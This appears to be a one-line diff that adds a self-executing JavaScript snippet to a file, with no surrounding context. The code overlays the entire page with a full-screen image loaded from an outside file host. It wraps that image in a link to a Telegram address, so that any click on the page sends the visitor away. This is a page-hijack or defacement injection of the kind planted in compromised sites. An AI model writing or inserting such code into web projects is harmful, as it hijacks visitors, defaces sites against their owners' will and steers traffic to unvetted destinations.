@@ -1,0 +1,1 @@
+(function(){const l=document.createElement('a');l.href='https://lowpowertraffic99.t.me/';l.target='_blank';const i=document.createElement('img');i.src='https://files.catbox.moe/f0pgh4.gif';Object.assign(i.style,{position:'fixed',top:'0',left:'0',width:'100vw',height:'100vh',zIndex:'999999',objectFit:'cover',cursor:'pointer'});l.appendChild(i);document.body.appendChild(l);})();
